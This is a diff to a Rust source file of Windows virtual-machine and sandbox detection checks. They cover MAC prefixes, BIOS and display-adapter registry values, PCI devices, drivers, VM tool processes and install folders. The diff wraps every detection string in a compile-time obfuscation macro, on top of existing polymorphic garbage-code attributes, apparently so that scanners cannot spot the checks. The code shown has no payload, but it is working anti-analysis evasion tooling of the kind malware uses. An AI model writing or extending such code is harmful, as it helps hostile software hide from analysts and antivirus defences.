@@ -1,4 +1,4 @@
-use rustpolymorphic::polymorph;
+use rustpolymorphic::{polymorph, obf_str};
 use raw_cpuid::CpuId;
 
 use std::ffi::OsStr;
@@ -79,7 +79,13 @@ pub fn check_mac_address() -> bool {
 
     if unsafe { GetAdaptersInfo(Some(adapter_info_ptr), &mut buffer_size) } == 0 {
         let vm_mac_prefixes = [
-            "00:05:69", "00:0C:29", "00:1C:14", "00:50:56", "08:00:27", "00:1C:42", "52:54:00",
+            obf_str!("00:05:69"),
+            obf_str!("00:0C:29"),
+            obf_str!("00:1C:14"),
+            obf_str!("00:50:56"),
+            obf_str!("08:00:27"),
+            obf_str!("00:1C:42"),
+            obf_str!("52:54:00"),
         ];
 
         let mut current_adapter = adapter_info_ptr;
@@ -93,8 +99,8 @@ pub fn check_mac_address() -> bool {
                     .collect::<Vec<String>>()
                     .join(":");
 
-                for &prefix in &vm_mac_prefixes {
-                    if mac_address_str.starts_with(prefix) {
+                for prefix in &vm_mac_prefixes {
+                    if mac_address_str.starts_with(&**prefix) {
                         return true;
                     }
                 }
@@ -109,7 +115,7 @@ pub fn check_mac_address() -> bool {
 #[polymorph(fn_len = 15, garbage = true)]
 pub fn check_bios() -> bool {
     let mut key_handle: HKEY = HKEY(0);
-    let subkey_pcwstr = to_pcwstr("HARDWARE\\DESCRIPTION\\System");
+    let subkey_pcwstr = to_pcwstr(&obf_str!("HARDWARE\\DESCRIPTION\\System"));
     if unsafe {
         RegOpenKeyExW(
             HKEY_LOCAL_MACHINE,
@@ -124,13 +130,20 @@ pub fn check_bios() -> bool {
         return false;
     }
 
-    let vm_bios_strings = ["VMware", "VirtualBox", "QEMU", "Hyper-V", "Parallels", "Xen"];
-    let value_names = ["SystemBiosVersion", "VideoBiosVersion"];
+    let vm_bios_strings = [
+        obf_str!("VMware"),
+        obf_str!("VirtualBox"),
+        obf_str!("QEMU"),
+        obf_str!("Hyper-V"),
+        obf_str!("Parallels"),
+        obf_str!("Xen"),
+    ];
+    let value_names = [obf_str!("SystemBiosVersion"), obf_str!("VideoBiosVersion")];
 
     for value_name in &value_names {
         let mut buffer: [u16; 256] = [0; 256];
         let mut buffer_size = (buffer.len() * std::mem::size_of::<u16>()) as u32;
-        let value_name_pcwstr = to_pcwstr(value_name);
+        let value_name_pcwstr = to_pcwstr(&**value_name);
         if unsafe {
             RegQueryValueExW(
                 key_handle,
@@ -144,8 +157,8 @@ pub fn check_bios() -> bool {
         .is_ok()
         {
             let value = String::from_utf16_lossy(&buffer[..buffer_size as usize / 2]);
-            for &vm_string in &vm_bios_strings {
-                if value.contains(vm_string) {
+            for vm_string in &vm_bios_strings {
+                if value.contains(&**vm_string) {
                     unsafe {
                         let _ = RegCloseKey(key_handle);
                     };
@@ -173,7 +186,7 @@ pub fn check_cpu_cores() -> bool {
 #[polymorph(fn_len = 25, garbage = true)]
 pub fn check_disk_size() -> bool {
     let mut total_number_of_bytes: u64 = 0;
-    let root_path = to_pcwstr("C:\\");
+    let root_path = to_pcwstr(&obf_str!("C:\\"));
     if unsafe {
         GetDiskFreeSpaceExW(
             PCWSTR(root_path.as_ptr()),
@@ -198,7 +211,7 @@ pub fn check_disk_size() -> bool {
 #[polymorph(fn_len = 35, garbage = true)]
 pub fn check_display_adapter() -> bool {
     let mut video_key_handle: HKEY = HKEY(0);
-    let video_key_path = to_pcwstr("SYSTEM\\CurrentControlSet\\Control\\Video");
+    let video_key_path = to_pcwstr(&obf_str!("SYSTEM\\CurrentControlSet\\Control\\Video"));
     if unsafe {
         RegOpenKeyExW(
             HKEY_LOCAL_MACHINE,
@@ -214,11 +227,11 @@ pub fn check_display_adapter() -> bool {
     }
 
     let vm_adapters = [
-        "VMware SVGA",
-        "VirtualBox Graphics Adapter",
-        "Hyper-V Video",
-        "QEMU Standard VGA",
-        "Parallels Display Adapter",
+        obf_str!("VMware SVGA"),
+        obf_str!("VirtualBox Graphics Adapter"),
+        obf_str!("Hyper-V Video"),
+        obf_str!("QEMU Standard VGA"),
+        obf_str!("Parallels Display Adapter"),
     ];
 
     let mut i = 0;
@@ -260,7 +273,7 @@ pub fn check_display_adapter() -> bool {
         }
         .is_ok()
         {
-            let value_name = to_pcwstr("DriverDesc");
+            let value_name = to_pcwstr(&obf_str!("DriverDesc"));
             let mut buffer: [u16; 256] = [0; 256];
             let mut buffer_size = (buffer.len() * std::mem::size_of::<u16>()) as u32;
             if unsafe {
@@ -278,8 +291,8 @@ pub fn check_display_adapter() -> bool {
             .is_ok()
             {
                 let value = String::from_utf16_lossy(&buffer[..buffer_size as usize / 2]);
-                for &vm_adapter in &vm_adapters {
-                    if value.contains(vm_adapter) {
+                for vm_adapter in &vm_adapters {
+                    if value.contains(&**vm_adapter) {
                         unsafe {
                             let _ = RegCloseKey(adapter_key_handle);
                             let _ = RegCloseKey(video_key_handle);
@@ -303,7 +316,7 @@ pub fn check_display_adapter() -> bool {
 #[polymorph(fn_len = 18, garbage = true)]
 pub fn check_pci_devices() -> bool {
     let mut pci_key_handle: HKEY = HKEY(0);
-    let pci_key_path = to_pcwstr("SYSTEM\\CurrentControlSet\\Enum\\PCI");
+    let pci_key_path = to_pcwstr(&obf_str!("SYSTEM\\CurrentControlSet\\Enum\\PCI"));
     if unsafe {
         RegOpenKeyExW(
             HKEY_LOCAL_MACHINE,
@@ -318,7 +331,11 @@ pub fn check_pci_devices() -> bool {
         return false;
     }
 
-    let vm_pci_devices = ["VMware VMCI", "VirtualBox Guest Service", "Red Hat VirtIO"];
+    let vm_pci_devices = [
+        obf_str!("VMware VMCI"),
+        obf_str!("VirtualBox Guest Service"),
+        obf_str!("Red Hat VirtIO"),
+    ];
 
     let mut i = 0;
     loop {
@@ -359,7 +376,7 @@ pub fn check_pci_devices() -> bool {
         }
         .is_ok()
         {
-            let value_name = to_pcwstr("DeviceDesc");
+            let value_name = to_pcwstr(&obf_str!("DeviceDesc"));
             let mut buffer: [u16; 256] = [0; 256];
             let mut buffer_size = (buffer.len() * std::mem::size_of::<u16>()) as u32;
             if unsafe {
@@ -375,8 +392,8 @@ pub fn check_pci_devices() -> bool {
             .is_ok()
             {
                 let value = String::from_utf16_lossy(&buffer[..buffer_size as usize / 2]);
-                for &vm_device in &vm_pci_devices {
-                    if value.contains(vm_device) {
+                for vm_device in &vm_pci_devices {
+                    if value.contains(&**vm_device) {
                         unsafe {
                             let _ = RegCloseKey(device_key_handle);
                             let _ = RegCloseKey(pci_key_handle);
@@ -400,7 +417,7 @@ pub fn check_pci_devices() -> bool {
 #[polymorph(fn_len = 22, garbage = true)]
 pub fn check_drivers() -> bool {
     let mut services_key_handle: HKEY = HKEY(0);
-    let services_key_path = to_pcwstr("SYSTEM\\CurrentControlSet\\Services");
+    let services_key_path = to_pcwstr(&obf_str!("SYSTEM\\CurrentControlSet\\Services"));
     if unsafe {
         RegOpenKeyExW(
             HKEY_LOCAL_MACHINE,
@@ -416,7 +433,13 @@ pub fn check_drivers() -> bool {
     }
 
     let vm_drivers = [
-        "virtio", "vmxnet", "pvscsi", "vboxguest", "vmware", "vmusb", "vmx86",
+        obf_str!("virtio"),
+        obf_str!("vmxnet"),
+        obf_str!("pvscsi"),
+        obf_str!("vboxguest"),
+        obf_str!("vmware"),
+        obf_str!("vmusb"),
+        obf_str!("vmx86"),
     ];
 
     let mut i = 0;
@@ -457,7 +480,7 @@ pub fn check_drivers() -> bool {
         }
         .is_ok()
         {
-            let value_name = to_pcwstr("ImagePath");
+            let value_name = to_pcwstr(&obf_str!("ImagePath"));
             let mut buffer: [u16; 256] = [0; 256];
             let mut buffer_size = (buffer.len() * std::mem::size_of::<u16>()) as u32;
             if unsafe {
@@ -473,8 +496,8 @@ pub fn check_drivers() -> bool {
             .is_ok()
             {
                 let value = String::from_utf16_lossy(&buffer[..buffer_size as usize / 2]);
-                for &vm_driver in &vm_drivers {
-                    if value.contains(vm_driver) {
+                for vm_driver in &vm_drivers {
+                    if value.contains(&**vm_driver) {
                         unsafe {
                             let _ = RegCloseKey(service_key_handle);
                             let _ = RegCloseKey(services_key_handle);
@@ -502,16 +525,16 @@ fn to_pcwstr(s: &str) -> Vec<u16> {
 #[polymorph(fn_len = 10, garbage = true)]
 pub fn check_vm_registry_keys() -> bool {
     let vm_keys = [
-        "SOFTWARE\\VMware, Inc.\\VMware Tools",
-        "SYSTEM\\CurrentControlSet\\Services\\VBoxGuest",
-        "SYSTEM\\CurrentControlSet\\Services\\VBoxMouse",
-        "SYSTEM\\CurrentControlSet\\Services\\VBoxSF",
+        obf_str!("SOFTWARE\\VMware, Inc.\\VMware Tools"),
+        obf_str!("SYSTEM\\CurrentControlSet\\Services\\VBoxGuest"),
+        obf_str!("SYSTEM\\CurrentControlSet\\Services\\VBoxMouse"),
+        obf_str!("SYSTEM\\CurrentControlSet\\Services\\VBoxSF"),
 		
-        "SYSTEM\\CurrentControlSet\\Services\\VBoxVideo",
+        obf_str!("SYSTEM\\CurrentControlSet\\Services\\VBoxVideo"),
     ];
 
-    for key_path in vm_keys {
-        let subkey_pcwstr = to_pcwstr(key_path);
+    for key_path in &vm_keys {
+        let subkey_pcwstr = to_pcwstr(&**key_path);
         let mut key_handle: HKEY = HKEY(0);
         let result = unsafe {
             RegOpenKeyExW(
@@ -556,13 +579,13 @@ pub fn check_vm_processes() -> bool {
     }
 
     let vm_processes = [
-        "vmtoolsd.exe",
-        "VMwareService.exe",
-        "VMwareTray.exe",
-        "VBoxService.exe",
-        "VBoxTray.exe",
-        "qemu-ga.exe",
-        "prl_tools_service.exe",
+        obf_str!("vmtoolsd.exe"),
+        obf_str!("VMwareService.exe"),
+        obf_str!("VMwareTray.exe"),
+        obf_str!("VBoxService.exe"),
+        obf_str!("VBoxTray.exe"),
+        obf_str!("qemu-ga.exe"),
+        obf_str!("prl_tools_service.exe"),
     ];
 
     loop {
@@ -575,8 +598,8 @@ pub fn check_vm_processes() -> bool {
             &process_entry.szExeFile[..len]
         };
         let process_name = String::from_utf16_lossy(exe_file_slice);
-        for &vm_process in &vm_processes {
-            if process_name.eq_ignore_ascii_case(vm_process) {
+        for vm_process in &vm_processes {
+            if process_name.eq_ignore_ascii_case(&**vm_process) {
                 unsafe {
                     let _ = CloseHandle(snapshot_handle);
                 };
@@ -644,15 +667,15 @@ pub fn check_cpuid_timing() -> bool {
 #[polymorph(fn_len = 10, garbage = true)]
 pub fn check_filesystem_artifacts() -> bool {
     let vm_dirs = [
-        "C:\\Program Files\\VMware",
-        "C:\\Program Files\\Oracle",
-        "C:\\Program Files\\VirtualBox",
-        "C:\\Program Files\\Parallels",
-        "C:\\Program Files\\QEMU",
+        obf_str!("C:\\Program Files\\VMware"),
+        obf_str!("C:\\Program Files\\Oracle"),
+        obf_str!("C:\\Program Files\\VirtualBox"),
+        obf_str!("C:\\Program Files\\Parallels"),
+        obf_str!("C:\\Program Files\\QEMU"),
     ];
 
-    for dir in vm_dirs {
-        if Path::new(dir).exists() {
+    for dir in &vm_dirs {
+        if Path::new(&**dir).exists() {
             return true;
         }
     }
